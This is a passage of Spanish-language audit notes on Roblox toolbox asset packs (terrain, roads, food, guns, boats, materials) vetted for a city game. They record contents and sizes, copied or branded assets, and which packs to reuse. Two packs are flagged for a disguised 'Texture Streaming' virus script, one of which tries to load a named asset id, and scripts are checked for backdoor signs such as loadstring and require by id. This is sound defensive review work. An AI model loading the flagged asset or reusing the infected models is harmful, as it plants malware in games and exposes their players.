| `Pebble` (sin SA) | 1 | 1.3x0.7x1.1 |

Limpio. ~8 000 tris por roca de media.

## 13388285234 — Realistic Terrain Asset Pack

Carga: ✅. Clases: `MeshPart` 1 640, `SurfaceAppearance` 1 352, `Model` 280, `Part` 62, `Texture` 81,
`Decal` 28, `Beam` 9, `ParticleEmitter` 4, `Script` 1. Talla total 1657.6 x 173.4 x 2156.0.

Dentro de `RealisticPartTerrainAssets`:

| Grupo | Talla | Piezas |
|---|---|---|
| `PBR Terrain/plant MEGA PACK` | 834.4x171.1x498.7 | 630 (586 SA): ramas, palmeras, helechos, rocas, abetos… |
| `My PBR pack Natural` | 123.4x26.4x129.9 | 196: palmeras, rocas con musgo, flores, fuego y salpicadura de agua |
| `PBR Kit - Desert` | 280.9x28.9x325.1 | 47: terreno de desierto, cactus, tronco caído |
| `Plateau Pack` | 184.0x39.0x83.0 | 20: meseta con estatuas y pilares |
| `Underwater Pack` | 284.7x62.8x137.4 | 14: algas, rayos de luz (Beam) |
| `PBR Food Pack` | 14.0x2.6x15.4 | 79: comida (`Meshes/body…_model0`) |
| `Palm Tree` ×4, `Willow Tree` (sauce, 47.2x47.3x49.9), `Tree`, `Bamboo`, `Bush` ×6, `Fern` ×15, `Swamp Plant` ×6, `Vines`, `Urban Vines` | — | sueltos |
| `Prop_TreeStreet` ×2 (árbol de calle, 5.9x51.5 / 9.6x84.0) | — | 2 MeshPart sin PBR |
| `Береза` (abedul) ×2, `Дерево`, `Сосна` (vacío) | — | árboles de un autor ruso |
| `landscape` ×2, `mtl` (164.0x82.0x206.5) | — | terrenos grandes sin PBR |
| `bramble001a`, `tree_deciduous_01a`, `tree_cliff_01a`, `tree_deciduous_card_01` | — | mallas de **Half-Life 2** |

El único script (`ReadMe!`) solo da las gracias y dice: «These are a bunch of assets I've grabbed around
toolbox». Es decir: **todo es de otros**. Hay un `Dummy` (muñeco) y un `FBXImportGeneric` vacío.

## 15004077857 — Realistic road pack

Carga: ✅. Clases: `Part` 50, `MeshPart` 19, `Texture` 106, `Decal` 11, `WedgePart` 6. Talla 97.8 x 22.9 x 320.0.

- `Road_02_A` (62.5x0.5x62.5) ×2 y `Road_02_B` (87.5x0.5x87.5) ×2: cruces de calzada (MeshPart sin SA).
- 15 losetas `Part` (10x0.5x10 y 5x0.1x5) con `Texture` de acera, asfalto, paso de cebra (`8558006990`),
  bordillo, adoquín.
- **Señales** (Decals, se han mirado): STOP (`8612134288`), DO NOT ENTER (`8612135055`), prohibido el
  paso (`8615142241`), velocidad 30 (`8612136088`) y 20 (`8615141417`), paso de peatones (`8615143034`),
  alcantarillas «STORM DRAIN» (`264036689`) y rejilla (`2472723275`). Útiles.
- Puente (`canal_bridge01`, 75.0x22.9x25.0, con `bridge_railing` y 10 `handrail04_long`): nombres de **Half-Life 2**.
- `c17billboardxccr` (cartel de «City 17», **Half-Life 2**) con un póster «XCCГ» (`220190597`).
- Un Decal en ruso «Техника» (`8612133612`).
- `GAZ-Volga` (7.2x5.1x17.1): coche ruso de **marca real**, malla sin PBR.

Sin scripts.

## 117850698505269 — Realistic Gun Pack Kit ⛔ contenido

Carga: ✅. 171 piezas, 107 MeshPart, 107 Sound, 59 scripts, 2 574 `FloatCurve` (animaciones).
Dos carpetas: `Script pack` (sistema de armas para ReplicatedStorage, ServerScriptService,
StarterPlayer…) y `Gun Models With Tool` con 4 `Tool`: **M4A1**, **AK**, **MP5** y **Tactical Pistol**
(nombres de armas reales; M4A1 y MP5 son modelos de fabricantes reales).

- Efectos de **sangre** y **gore** (`BloodEffect`, `GoreEffect`, textura `241685484`).
- Scripts: `SimulateBulletScript` echa (`Kick`) a quien trampee las estadísticas del arma (es un
  antitrampas, no una puerta trasera); `MessageManager` y `Footsteps` usan `PlayerAdded`; un
  `StarterCharacter`. Ningún `require(número)`, `loadstring` ni `HttpService`.
- `RemoteHandler` empieza con una línea rara (`if nil then repeat until nil script:Destroy() end`) que
  no hace nada.

**No usar**: un juego de vida para todos no necesita armas con sangre. (Si algún día hace falta una
pistola para la policía, mejor una propia sin nombre real ni sangre.)

## 17519952806 — realistic filipino street food pack

Carga: ✅. 16 `MeshPart` + 4 `Part` en 5 `Model` (sin SurfaceAppearance, colores lisos). Talla 5.1 x 1.9 x 3.6.

| Comida | Talla | Piezas |
|---|---|---|
| `balut egg` (huevo) | 0.9x1.1x0.9 | 1 |
| `betamax` (sangre de cerdo cuajada en pincho; aquí son 3 cubos marrones) | 0.7x0.5x3.5 | 4 |
| `calamares` (aros) | 1.3x0.4x3.6 | 4 |
| `isaw` (tripa a la brasa) | 0.8x3.4x0.6 | 6 |
| `quek quek` (huevos rebozados) | 0.6x3.2x0.5 | 5 |

Las 5 piezas «rojas» son el isaw (marrón rojizo, material Mud), no sangre. Limpio.

## 130843005739076 — Realistic Fish PACK

Carga: ✅. 248 piezas (138 MeshPart), 237 `Bone`, 25 `Animation`, 20 scripts, 2 `Tool`.
Talla total 688.9 x 469.3 x 792.5 (por el kraken).

- **Peces sueltos** (útiles para una pescadería o un acuario): `Cod` 5.2x0.8x1.9, `Grouper` 9.4x2.9x1.9,
  `BARRAMUNDI` 6.1x2.7x1.7, `Amberjack`, `Cobia`, `Blenny`, `Blue Fish`, `Barracuda`, `Tiger Muskellunge`,
  `Piranha`, `Arapaima` (24 de largo), `Pez congelado realista`, 4 `boid` (lubina), `Sea Creature Pack`
  (peces tropicales, corales, rocas; 99.8x19.0x66.5) y 2 Tools (`Rainbow Trout`, `Sardine`).
- **No usar**:
  - `kraken` (468.8x139.3x596.0) con `Humanoid`, `Reward` (da XP al matarlo) y `Respawn`; el script
    `Death` solo dice `-- Decompiling is disabled` (copiado de otro juego).
  - `Nile Crocodile`: su mandíbula **quita 30 de vida** al tocarla.
  - `NPC That Follows You` con una pieza `Damage`.
  - `Sketchfab_Scene` (gran tiburón blanco de **Sketchfab**: licencia desconocida).
  - `FBXImportGeneric` con `studio_Mosasaurus.smd` (formato de Valve: **sacado de un juego**).
  - `Blue whale` (72.8x288.9x58.5), `Whale Shark`: enormes.

Scripts: animaciones, daño y premio del kraken. Sin red ni `require` de ids.

## 11347783499 — City Pack/Realistic City

Carga: ✅. 2 422 `Part`, 2 402 `Decal`, 1 195 `BlockMesh`, 692 `SpecialMesh`, 738 `Snap`, 8 `Script`.
Talla 2048.3 x 940.5 x 1836.4. Dentro: `-- Look Inside me --` con `PUT IN WORKSPACE` y `PUT IN LIGHTING`.

- Ciudad de rascacielos hecha con bloques (`Smooth Block Model` ×881, `Spire` ×172), calles
  `Straight` ×204 y cruces `4-Way Intersection` ×104 con Decals de 2009–2010 (ventanas `33482779`,
  `34658399`…). Farolas con 8 scripts iguales que hacen parpadear la luz en un bucle sin fin.
- `PUT IN LIGHTING`:
  - `Sky`: las 6 caras `91458024` (abajo `91457980`).
  - `Atmosphere`: Density 0.202, Offset 0, Color (200,170,108), Decay (92,60,14), Glare 0, Haze 0.
  - `BlurEffect` Size 2; `DepthOfFieldEffect` FarIntensity 0.117, FocusDistance 55.4, InFocusRadius 32.4,
    NearIntensity 0.09; `SunRaysEffect` Intensity 0.25, Spread 1.

Valoración: **no usar** (se ve antiguo y son miles de piezas). La Atmosphere cálida puede servir de idea.

## 123159368741340 — Realistic Materials Pack

Carga: ✅. 53 `Part` (51 losetas de 4x1x4 + suelo 38x0.2x58.5) con 283 `Texture` y 18 `Decal`, y un
texto 3D «Realistic Materials Pack» (22 MeshPart, una por letra). **No hay MaterialVariant ni
SurfaceAppearance**: cada loseta lleva la misma imagen en sus caras (`74887636589224`,
`138169265085488`…, todas subidas en 2025–2026). Sin scripts.

## 4609898985 — Realistic Food pack

Carga: ✅. 26 `MeshPart` sin nombre (21 `MeshPart` + 5 `meshblock`) en 6 `Model`. Talla 20.1 x 3.3 x 9.1.
Texturas mirando la imagen: café, galleta, pescado/sushi, manzana, panes, baguette, muslo de pollo,
caja de pizza «HOT PIZZA», mantel, fresas, corteza, dónut.

- **Marcas**: lata **Coca-Cola** (`3152296920`), lata **Pepsi** (`3152299417`), botella **Coca-Cola**
  (`3152317461`). Hay que cambiar esas texturas.
- 3 texturas **bloqueadas** por Roblox (`3157451449`, `3157529485`, `3157633680`): esas piezas salen sin dibujo.
- Unas botellas verdes (`3157607361`, de cristal) que pueden ser de cerveza/vino.
- Un Decal con el logo del autor («JEJ», `3156941268`).

Sin scripts.

## 13877830677 — Realistic Landscape Pack

Carga: ✅. 431 piezas (321 MeshPart, 211 SurfaceAppearance), 80 `Decal` de hierba antigua. Talla 462.5 x 79.0 x 690.0.

| Objeto | Cuántos | Talla |
|---|---|---|
| `Boulder` | 18 | 34.8x27.9x33.5 … 73.3x39.8x38.2 |
| `LargeBoulder` | 18 | 36.4x36.7x27.5 … 115.2x45.3x106.7 |
| `Medium Moss Boulder` / `Meshes/Medium Boulder` | 8 | 15.8 … 27.1 |
| `Realistic rock` (sin PBR) | 1 | 79.9x44.9x42.4 |
| `Rock Arch` | 1 | 21.2x19.3x32.5 |
| `Tree` (Tree_0 + Tree_1) | 4 | 21.0x43.0x26.1 … 31.1x63.8x38.8 |
| `Meshes/Leaves_Tree_Generic_Giant` | 1 | 63.0x56.0x65.6 |
| `MapleLeafTree` | 3 | 8.8 … 10.2 |
| `Rhododendron` | 4 | 4.5x2.4x5.6 … 7.8x4.1x9.5 |
| `Fern`, `FernTall`, `CloverPatch`, `Bush Leaves Grass` ×5 | — | — |
| `FallenTreeMossy`, troncos `…_LOD` (Quixel) | — | 34.1x5.3x4.8 … 36.6x7.3x19.3 |
| 12 `Model` de decorado (hiedra `Creeper Ivy`, farol japonés `Japanese Toro Stone Lantern`…) | 12 | hasta 94.8x79.0x134.0 |

Sin scripts. 1,18 millones de tris: es pesadísimo entero.

## 9802494780 — Small Realistic Mesh Pack

Carga: ✅. 6 `MeshPart` sin nombre, con `TextureID` (sin PBR). Vistos en miniatura:

| Malla | Talla | Qué es |
|---|---|---|
| `6390514385` | 38.8x114.6x36.8 | chimenea industrial |
| `6414872517` | 18.0x93.0x62.0 | torre de alta tensión |
| `6419583704` | 24.8x21.3x33.1 | depósitos con tuberías |
| `6419574983` | 34.1x13.5x30.5 | depósito horizontal |
| `6419559735` | 11.1x10.1x27.6 | 3 tubos grandes atados |
| `6419727834` | 8.2x14.2x13.4 | armario/caseta metálica |

Sin scripts.

## 100792423689137 — --Realistic Gun Pack--

Carga: ✅. 390 `Part` (con BlockMesh/CylinderMesh), 4 `Tool` en `StarterPack`: **M4A1**, **Vector**,
**AK47**, **M1911** (armas reales). 32 scripts (14 distintos): `MainScript` de 8 000 caracteres en el
cliente (sistema antiguo, no funciona con FilteringEnabled), agacharse/tumbarse, GUI de munición.
Sin red ni `require` de ids. **No usar.**

## 13728551087 — Bipolaroid's Realistic Boats Pack

Carga: ✅. 41 `MeshPart` + 4 `Part` en la carpeta `Boats`. 576 `Decal` y 72 `Texture` de óxido y suciedad
(en el barco hundido). **Sin scripts, sin asientos, sin motor**: cada barco es una sola malla (o unas
pocas), de decoración. Talla total 319.1 x 87.7 x 314.5.

| Barco | Talla | Piezas | Casco / asientos / motor |
|---|---|---|---|
| Buque de guerra (`Model`, 18 MeshPart, mallas `2325895955`…) | 37.7x87.7x314.5 | 18 | casco en varias mallas (la mayor 37.7x60.6x313.3) + superestructura; sin asientos ni motor aparte |
| Pesquero de arrastre (`MeshPart`, `3467130089`) | 27.4x101.4x54.2 | 1 | todo en una malla |
| Pesquero oxidado (`3467235742`, CorrodedMetal) | 25.7x95.4x67.7 | 1 | todo en una malla |
| Pesquero con redes (`3467237518`) | 25.1x89.2x52.8 | 1 | todo en una malla |
| Pesquero (`3467136490`) | 27.4x101.4x40.3 | 1 | todo en una malla |
| `Boat` pesquero pequeño (`515452824`) | 70.7x42.0x19.9 | 1 | todo en una malla (cabina y mástil incluidos) |
| Lancha neumática de rescate (`Meshes/0R1H…`, `5956797983`) | 19.9x15.0x58.1 | 1 | casco + consola en una malla |
| Barco hundido en la arena (`Model`, `4785648929` + 11 `IceStalag`) | 18.9x15.6x43.1 | 16 | casco con bancos, en una malla; las IceStalag son estalactitas con óxido |
| `Smash Mouth Boat` lancha rápida (`836090935`) | 8.5x25.5x5.4 | 1 | casco con asientos dibujados en la textura |
| `small boat` ×3 (barca con motor fueraborda, `595497360`, 3 colores) | 19.0x5.8x5.2 | 1 | casco, bancos y motor en una sola malla |
| `Boat 2` | 12.0x6.0x3.0 | 1 | una malla |

Para usarlos como barcos de verdad haría falta poner un `VehicleSeat` y un sistema de navegar propio.

## 16088161488 — Wessel Realistic road pack

Carga: ✅. 8 `Part` (30x1x4 bordillos y 30x0.1x30 losetas) con 15 `Texture` y 3 `Decal` antiguos
(`2091430777` ×11, `2091365431`, `2091416637`…). Sin scripts. Talla 109.3 x 1.0 x 70.7.

## 9262569938 — Realistic Rock Pack (Necta Developments)

Carga: ✅. 5 `MeshPart` con SurfaceAppearance: `Meshes/Type1` 2.3x1.4x2.6, `Type2` 3.6x1.6x4.0,
`Type3` 1.5x3.5x1.6, `Type4` 1.5x3.6x1.3, `Type5` 1.6x1.7x1.4. ~1 000 tris por piedra (5 046 en total).
Sin scripts. El autor explica que son de pocos polígonos con texturas PBR.

## 13752145820 — Realistic Packs (27 MaterialVariant)

Carga: ✅. Un `Model` llamado «MaterialService and ctrl+u» con 27 `MaterialVariant` (instrucciones:
moverlos a MaterialService). Sin piezas ni scripts. Todos con `MaterialPattern = Regular`.

| Name | BaseMaterial | StudsPerTile | MaterialPattern |
|---|---|---|---|
| Bricks | Brick | 10 | Regular |
| Carpet 1 | Fabric | 2 | Regular |
| Checkered Tile | Metal | 8 | Regular |
| Cloudy Metal | Metal | 6 | Regular |
| Cobblestone | Cobblestone | 10 | Regular |
| Concrete Tile (Studded) | Concrete | 6 | Regular |
| Concrete Tile 1 | Concrete | 10 | Regular |
| Concrete Tile 2 | Concrete | 10 | Regular |
| Corroded Metal 2 | Metal | 5 | Regular |
| Cushion | Fabric | 8 | Regular |
| Dirty Tile | Metal | 6 | Regular |
| Fabric | Fabric | 2.886 | Regular |
| Floor Tile 1 | Metal | 10 | Regular |
| Floor Tile 2 | Metal | 15 | Regular |
| Grass | Grass | 15 | Regular |
| GrassRocks | Slate | 20 | Regular |
| Marble Tile 1 | Marble | 8 | Regular |
| Metal | DiamondPlate | 1.393 | Regular |
| Metal Weave 1 | Metal | 10 | Regular |
| Mosiac | Metal | 8 | Regular |
| Polished Metal | Metal | 10 | Regular |
| Shiny Tile | Metal | 8 | Regular |
| Studded Metal | Metal | 8 | Regular |
| Wood | Wood | 10 | Regular |
| WoodenPlanks | WoodPlanks | 10 | Regular |
| Woven Brick | Brick | 11 | Regular |
| wood1 | Wood | 10 | Regular |

Ojo: `Bricks`, `Cobblestone`, `Grass`, `Wood`, `Fabric` y `Metal` se llaman casi como los materiales de
Roblox. Un MaterialVariant solo se aplica si una pieza lo nombra en `MaterialVariant` o si en
MaterialService se pone como sustituto del material base; aun así, mejor renombrarlos (p. ej. `NV_Bricks`).
Varias baldosas usan `Metal` como base (brillo de metal): revisar en Studio.

## 123553303846741 — Bloxburg Textures Pack ⛔

Carga: ✅. Carpeta `cozy` con 65 `Part` de 8x1x8, cada una con una `Texture` (SmoothPebble,
HerringboneWood, SubwayTile, Elephants, Birds, Plaid, AcousticalCeilingTiles…), y el **virus** descrito arriba.

**¿Copiado de Bloxburg?** Sí: los nombres son los de las paredes y suelos de *Welcome to Bloxburg* y, al
mirar quién subió las imágenes, `3488684485` (Elephants), `2413366364` (SmallRoundedTiles) y
`201130786` (PlanksLong) son de **Coeptus**, el creador de Bloxburg (2015–2019). Alguna es de otros
autores (`319942918` de ZacAttackk, `17586283155` de 2024). **No usar** por las dos cosas.

## 7485807340 — Hyper-Realistic Night Pack

Carga: ✅. `Realistic Night Pack (UNGROUP!)` con `Map` (hierba ×39, 9 árboles con SurfaceAppearance,
15 mallas «Escape the school obby gym terrian» —sacadas de ese juego—, `SpawnLocation`),
`PUT ME IN STARTERPLAYERSCRIPTS!`, `PUT ME IN WORKSPACE!`, `PUT ME IN LIGHTING!` y un
`Thumbnail (Deletes Self)`.

**Sky** (`PUT ME IN LIGHTING!`): las 6 caras `83951719` (una sola imagen de bosque oscuro),
`SunTextureId = rbxasset://sky/sun.jpg`, `MoonTextureId = rbxasset://sky/moon.jpg`,
`SunAngularSize = 21`, `MoonAngularSize = 11`, `StarCount = 3000`, `CelestialBodiesShown = true`,
`SkyboxOrientation = 0,0,0`.
No trae `Atmosphere`, `Bloom`, `ColorCorrection`, `SunRays` ni `DepthOfField`: los «efectos» los ponen los scripts.

Scripts (14, ⚠; 6 distintos):

| Script | Dónde | Qué hace |
|---|---|---|
| `Darkness` | Workspace | `Lighting.FogStart = 10`, `FogEnd = 100`, `FogColor` negro, `TimeOfDay = "00:00"`. |
| `First Person Script` | Workspace | Bucle infinito cada 0,01 s que obliga a **todos** a primera persona. Quitar. |
| `MotionBlur` | StarterPlayerScripts | Crea un `BlurEffect` que sube al girar la cámara. |
| `RainScript` + módulo `Rain` | StarterPlayerScripts | Lluvia de buildthomas (2018, licencia **Apache 2.0**), texturas `1822883048`/`1822856633`, sonido `1516791621`. Limpio y reutilizable. |
| `Tree…OuterLeaves/Script` ×9 | cada árbol | Mueve las hojas con `while true … wait()` en el servidor. Quitar. |

## 82042358715900 — Wall socket decoration ⛔

Carga: ✅. Un `Model` «Decoration» con una `MeshPart` (enchufe doble de 0.6x1.1x0.1) y una `Part` que
lleva el **virus** (mismo script «Texture Streaming», `Credits`, texto al revés y «Error 501»; aquí
intenta cargar `124350878966495`). La descripción del toolbox dice «No Scripts»: es mentira. **No usar.**
(Un enchufe se puede hacer en 2 minutos con una Part y un Decal propio.)

## 8919681750 — Velvet's Realistic Nature Pack

Carga: ✅. 693 piezas (687 MeshPart, 494 SurfaceAppearance). Talla total 1329.8 x 126.6 x 557.2.
Incluye un muestrario `PBR TEXTURE PACK V 0.2` (336.0x315.2x8.0, 220 MeshPart con SA y letras 3D) y un
`README` que dice: «I did not made any of these textures, I just downloaded them and uploaded them».

Árboles (cada uno es un `Model`):

| Árbol | Talla | Piezas |
|---|---|---|
| `DouglasFIr-01-0Lod` (abeto Douglas) | 32.6x83.8x32.5 | 11 |
| `DouglasFIr-02-0Lod` | 32.8x84.8x33.2 | 10 |
| `DouglasFIr-03-0Lod` | 33.3x87.9x31.4 | 10 |
| `DouglasFIr-04-0Lod` | 31.7x88.3x32.9 | 11 |
| `DouglasFIr-05-0Lod` | 31.4x83.7x33.3 | 10 |
| `AspTree-01-0Lod` (álamo temblón) | 40.5x111.9x39.5 | 25 |
| `PonderosaPine01-0Lod` (pino ponderosa) | 42.3x99.0x40.0 | 10 |
| `OldSpruceTree-01-0Lod` (pícea vieja) | 36.6x85.3x35.9 | 9 |
| `OldSpruceTree-02-0Lod` | 31.4x94.2x29.8 | 12 |
| `OldSpruceTree-03-0Lod` | 27.1x90.0x27.4 | 11 |
| `MapleTree-01-0Lod` (arce) | 38.1x35.1x28.1 | 14 |
| `ElmTree-01-0Lod` (olmo) | 44.0x44.0x51.7 | 30 |
| `Oak-01-0Lod-Mossy` (roble con musgo) | 30.2x32.8x30.5 | 9 |
| `Oak-02-0Lod` (roble) | 30.2x32.8x30.5 | 9 |
| `OLD` (grupo de 6 abetos) | 50.5x90.7x193.3 | 70 |
| `Tree` ×7 (Tree_0 + Tree_1) | 23.3x25.1x21.0 … 50.9x104.9x45.4 | 2–3 |
| `BeechwoodTreeLarge` (haya grande) | 104.3x124.6x79.0 | 2 |
| `BeechwoodTree` ×3 | 13.3x25.3x18.1 … 74.2x88.6x56.2 | 2 |
| `RedwoodTreeLarge-` (secuoya) | 47.6x113.1x46.3 | 7 |
| `RedwoodTree-` | 41.5x98.6x40.4 | 2 |
| `Redwoodtree-LowLOD-` | 36.0x85.5x35.1 | 3 |
| `MapleLeafTree` ×2 | 9.9x6.8x9.4 / 33.7x23.3x32.0 | 2 |
| `Rhododendron`, `Bush` | 10.0x5.3x12.3 | 2 |
| Muertos: `DeadBeechwoodTree` ×5, `DeadJapanwoodTree` ×2, `DeadMapleLeafTree`, `DeadDogWoodTree`, `DeadBroadLeafTree`, `DeadBeechwoodSappling` | 4.6x12.1 … 45.4x73.5 | 1 |

Además: rocas (`Big Rock`, `Mid Rock`, `Granit`, `Nordic Cliff`, `LargeBoulder`, rocas de Quixel
`Aset_rock_granite_…`, `t…fa_LOD`), nieve (`Snow Road`, `Snow Bank` ×4, `Snow 2/3 PBR`, `Ice Cliff` ×4),
helechos, tréboles, troncos caídos, `ParticleEffect-LeavesFalling` y `RiverFlow`.
Los árboles «-0Lod» tienen pinta de venir de un pack de Unity/Unreal; pesan mucho (1 millón de tris el pack).

## Lo mejor de esta tanda

Para que la ciudad se vea realista, por orden:

1. **13752145820 — Realistic Packs (27 MaterialVariant).** Lo más barato y lo que más se nota: baldosas,
   moqueta, mármol, adoquín, ladrillo y madera PBR para suelos, aceras e interiores. Renombrarlos antes de
   meterlos en MaterialService.
2. **13262637537 — furniture pack (solo la parte «Furniture_…»).** La cocina completa, el frigorífico que
   se abre, las cómodas con cajones, los sofás para sentarse y las lámparas que se encienden. Dejar fuera
   lo de terror, los props de Half-Life 2 y el `StarterCharacter`.
3. **113264079562085 — Factory Props.** Carretilla elevadora, transpaletas, cintas y palés PBR, sin
   scripts: para el almacén, el puerto o la zona industrial (usar pocas cajas).
4. **15004077857 — Realistic road pack (solo señales y alcantarillas).** STOP, prohibido, 20/30, paso
   de peatones y tapas de alcantarilla: dan mucha vida a las calles. Sin el cartel de City 17, el puente ni el Volga.
5. **8553512581 + 16879341926 + 9262569938 — rocas y naturaleza PBR.** Árboles de Roblox, rocas con musgo y
   piedras pequeñas (~1 000 tris) para parques, bordes de carretera y el río. Limpios.
6. **9802494780 — Small Realistic Mesh Pack.** Chimenea, torre de alta tensión y depósitos: el fondo
   industrial de la ciudad con solo 9 704 tris.
7. **9432856072 — Car Pack (solo como base de carrocerías).** Los coches aparcados y el autobús escolar
   quedarían muy bien, pero hay que quitar marcas, logos, la radio y **todos** los scripts (sobre todo
   `Protector 2.0`), y usar nuestro propio sistema de coches.
8. **7485807340 — Night Pack (solo la lluvia).** El módulo `Rain` (Apache 2.0) para días de lluvia. El
   resto sobra.

**Nunca**: 123553303846741 y 82042358715900 (virus), los dos packs de armas, los animales que hacen daño
(kraken, cocodrilo) y la ciudad antigua de bloques.
